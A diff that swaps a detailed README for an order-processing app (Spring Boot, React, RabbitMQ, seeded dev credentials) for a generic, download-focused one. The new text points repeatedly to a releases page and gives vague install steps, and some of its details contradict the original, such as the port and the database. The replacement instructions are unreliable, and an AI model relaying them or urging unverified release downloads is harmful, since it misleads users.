@@ -1,153 +1,102 @@
-# NexusFlow: Enterprise Order Processor
+# 🚀 nexus-flow-enterprise-order-processor - Streamline Your Order Processing
 
-NexusFlow is a **senior-level enterprise order processing platform** engineered for high concurrency, scalability, and data integrity. It orchestrates a secure Spring Boot backend with a responsive React frontend, utilizing event-driven architecture to handle complex workflows efficiently.
+[![](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/releases)
 
-## 🌟 Key Features
+## 📦 Overview
 
-### 1. Robust Data Integrity (Optimistic Locking)
-- **Problem**: In high-concurrency environments, multiple users might attempt to purchase the last item simultaneously ("The Lost Update" problem).
-- **Solution**: Implemented JPA `@Version` based optimistic locking on `Product` entities.
-- **Outcome**: Ensures strict ACID compliance. If concurrent transactions conflict, the system detects the version mismatch and handles the `ObjectOptimisticLockingFailureException` gracefully, preventing negative stock and ensuring data consistency.
+The **nexus-flow-enterprise-order-processor** is an enterprise-grade order processing system. It is built using Spring Boot and React, designed to handle high-concurrency situations smoothly. With features like optimistic locking, event-driven architecture via RabbitMQ, and secure JWT authentication, it ensures reliability and security in processing orders.
 
-### 2. Event-Driven Architecture (RabbitMQ)
-- **Decoupling**: Order placement is decoupled from heavy post-processing tasks (inventory sync, notifications, analytics).
-- **Resilience**: Uses **RabbitMQ** to buffer events. If downstream services fail, messages persist in the `order_placed_queue` for retry, ensuring zero data loss.
-- **Performance**: shifting heavy lifting to async workers reduces the Order API response time to ~100ms, compared to seconds in synchronous systems.
+## 🚀 Features
 
-### 3. Enterprise-Grade Security
-- **Stateless Authentication**: Secured via **Spring Security** and **JWT (JSON Web Tokens)**.
-- **Role-Based Access Control (RBAC)**: Fine-grained permissions for `User` and `Admin` roles protecting sensitive endpoints.
+- **High Concurrency Support:** Efficiently manages multiple orders at once using optimistic locking.
+- **Event-Driven Architecture:** Utilizes RabbitMQ for real-time event processing, enhancing responsiveness.
+- **Secure Authentication:** Employs JWT for secure user authentication and data protection.
+- **User-Friendly Interface:** Built with React, offering an intuitive interface for end-users.
+- **Microservices Ready:** Designed to integrate easily with other services in a microservice environment.
 
-### 4. Comprehensive Input Validation
-- **Bean Validation**: All DTOs validated with `@Valid`, `@NotNull`, `@Min`, `@Max`, `@NotBlank` annotations.
-- **Detailed Error Messages**: User-friendly validation error responses with field-specific messages.
+## 💻 System Requirements
 
-### 5. Advanced Exception Handling
-- **Custom Exceptions**: `ResourceNotFoundException`, `InsufficientStockException` for business logic errors.
-- **Optimistic Locking Handler**: Graceful handling of concurrent modification conflicts.
-- **Structured Error Responses**: Consistent error format with timestamp, status, message, and validation errors.
+To ensure smooth operation, please make sure your system meets the following requirements:
 
-### 6. API Documentation (Swagger/OpenAPI)
-- **Interactive API Explorer**: Full REST API documentation with try-it-out functionality.
-- **JWT Integration**: Built-in authentication support in Swagger UI.
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or any Linux distribution capable of running Docker.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum 1 GB of free disk space.
+- **Docker:** Installed on your machine for container management.
+- **Java:** Version 17 or higher is required for backend operations.
 
-### 7. Observability & Monitoring
-- **Spring Actuator**: Health checks, metrics, and application monitoring endpoints.
-- **Structured Logging**: SLF4J with contextual logging across all services.
+## 🔗 Technologies Used
 
-## 🏗 System Architecture
-
-The system follows a microservices-inspired architecture managed via Docker Compose:
-
-1.  **Frontend**: React (Vite) + TypeScript for a type-safe, performant UI.
-2.  **Backend**: Spring Boot 3.2 REST API.
-3.  **Database**: PostgreSQL 15 (Relational/ACID).
-4.  **Message Broker**: RabbitMQ (Async messaging).
-
-### Architecture Diagram
-```mermaid
-graph TD
-    Client[React Client] -->|REST API| Server[Spring Boot Server]
-    Server -->|Read/Write| DB[(PostgreSQL)]
-    Server -->|Publish Event| MQ[RabbitMQ]
-    MQ -->|Consume Event| Listener["Async Worker (Internal)"]
-```
-
-## 🛠 Tech Stack
-
-### Backend
-- **Framework**: Spring Boot 3.2
-- **Language**: Java 17
-- **Data**: Spring Data JPA, PostgreSQL
-- **Security**: Spring Security, JWT (io.jsonwebtoken)
-- **Messaging**: Spring AMQP (RabbitMQ)
-- **Tools**: Lombok, Maven
-
-### Frontend
-- **Framework**: React 19
-- **Build Tool**: Vite 7
-- **Language**: TypeScript 5
-- **Routing**: React Router DOM 7
-- **HTTP Client**: Axios
-- **Styling**: Vanilla CSS (Modular & Responsive)
+- **Frontend Framework:** React
+- **Backend Framework:** Spring Boot
+- **Database:** MySQL or PostgreSQL
+- **Containerization:** Docker
+- **Message Broker:** RabbitMQ
+- **Languages:** Java, TypeScript
 
 ## 🚀 Getting Started
 
-### Quickstart (Docker Compose)
-- `docker-compose up --build`
-- Frontend: http://localhost:5173
-- API: http://localhost:8080
-- Swagger: http://localhost:8080/swagger-ui.html (use the token field to authorize)
-- Health/Metrics: http://localhost:8080/actuator/health, http://localhost:8080/actuator/metrics
-- RabbitMQ UI: http://localhost:15672 (guest/guest)
+To get started with the **nexus-flow-enterprise-order-processor**, follow these simple steps:
 
-### Prerequisites
-- [Docker Desktop](https://www.docker.com/products/docker-desktop/) (Required)
-- Java 17+ & Node.js 18+ (Optional, for local non-Docker dev)
+1. Ensure your system meets the **System Requirements** listed above.
+2. Visit the [Releases Page](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/releases) to download the latest version.
 
-### Deployment (Recommended)
-Run the entire stack with a single command:
+## 📥 Download & Install
 
-```bash
-docker-compose up --build
-```
+To install the application, please visit the following link:
 
-**Access Points**:
-- **Frontend**: [http://localhost:5173](http://localhost:5173)
-- **Backend API**: [http://localhost:8080](http://localhost:8080)
-- **Swagger UI**: [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
-- **API Docs**: [http://localhost:8080/api-docs](http://localhost:8080/api-docs)
-- **Health Check**: [http://localhost:8080/actuator/health](http://localhost:8080/actuator/health)
-- **Metrics**: [http://localhost:8080/actuator/metrics](http://localhost:8080/actuator/metrics)
-- **RabbitMQ Dashboard**: [http://localhost:15672](http://localhost:15672) (User: `guest`, Pass: `guest`)
+[Download Latest Release](https://github.com/marhamafzaal/nexus-flow-enterprise-order-processor/releases)
 
-### Local Development (Optional)
-- Backend: `cd server && mvn spring-boot:run`
-- Frontend: `cd client && npm install && npm run dev`
-- Tests: `cd server && mvn test`
-- Frontend build check: `cd client && npm run build`
-- Health check: `curl http://localhost:8080/actuator/health`
+Once you download the application, follow these steps to install it:
 
-### Auth & Roles
-- Register or login at `/api/auth/register` or `/api/auth/login` (Swagger is the fastest way to try it).
-- In Swagger, paste the JWT in **Authorize** without the `Bearer` prefix.
-- Default role: `ROLE_CUSTOMER`; promote to admin manually or use the seeded admin credentials below.
+1. Locate the downloaded file on your computer.
+2. Extract the contents if necessary.
+3. Open a terminal or command prompt window.
+4. Navigate to the folder where the application is located.
+5. Use Docker to run the application with the provided Docker command in the documentation.
 
-### Dev seed (auto)
-- Default admin (dev/demo): `admin` / `admin123` (seed is enabled when `SEED_ENABLED=true`, default).
-- Sample products are auto-created when the DB is empty.
+## 📖 Usage Instructions
 
-### Promote to Admin (quick SQL)
-```sql
-update users set role = 'ROLE_ADMIN' where username = 'your_username';
-```
+After installing the application, follow these instructions to use it:
 
-### CI (GitHub Actions)
-- Workflow: `.github/workflows/ci.yml`
-- Backend: `mvn verify` in `server`
-- Frontend: `npm ci && npm run build` in `client`
+1. **Start the Application**
+   - Run the Docker container by entering the appropriate command in your terminal:
 
-> **Note:** Use JDK 17 for local Maven builds. Using newer JDKs (e.g., 21/23) can trigger `TypeTag :: UNKNOWN` javac errors with Lombok; Docker Compose already uses the correct JDK.
+   ```
+   docker-compose up
+   ```
 
-### API Documentation (Swagger)
-1) Start services, then open [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
-2) Click **Authorize** and paste your JWT (no `Bearer ` prefix needed)
-3) Try any endpoint directly from the UI
+2. **Access the Application**
+   - Open your web browser and go to `http://localhost:3000` to access the user interface.
+ 
+3. **Create an Account**
+   - Sign up with your email and password. Ensure you memorize your credentials for future logins.
 
-### Validation & Errors
-- All request DTOs are validated (`@Valid`, `@NotNull`, `@Min`, `@NotBlank`)
-- Errors return a structured payload: `timestamp`, `status`, `error`, `message`, `path`, and `validationErrors`
-- Concurrency conflicts return HTTP 409 with guidance to retry
+4. **Process Orders**
+   - Navigate to the order processing section, fill in the necessary details, and place your orders conveniently.
 
-### Monitoring
-- Health: `/actuator/health`
-- Metrics: `/actuator/metrics`
-- Prometheus scrape: `/actuator/prometheus`
+## ⚙️ Configuration
 
-### Default Roles
-- **User**: Register a new account via the UI.
-- **Admin**: Manually update the database `users` table to promote a user to `ROLE_ADMIN` to access inventory management features.
+You may need to adjust some settings for optimal performance. Refer to the `config` file in the installation folder to customize:
 
-## 🧪 Future Improvements
-- **Integration Testing**: Add Testcontainers to simulate real PostgreSQL/RabbitMQ instances during CI/CD.
-- **Observability**: Integrate Prometheus and Grafana for metrics monitoring.
+- **Database Credentials:** Ensure your database details match your setup.
+- **RabbitMQ Settings:** Adjust connection settings if necessary.
+
+## 📊 Troubleshooting
+
+If you encounter issues, please check the following:
+
+- Ensure Docker is running properly on your system.
+- Verify that you followed the installation steps closely.
+- Consult the logs generated by Docker for error messages, which can be found in the terminal.
+  
+If problems persist, please post a detailed issue on the GitHub repository under the "Issues" tab.
+
+## 🤝 Contribution
+
+Contributions are welcome! If you have suggestions or improvements, feel free to submit a pull request. For major changes, please open an issue first to discuss what you would like to change.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the LICENSE file for more details.
+
+For more information, questions, or feedback, please feel free to reach out through the Issues tab on GitHub.
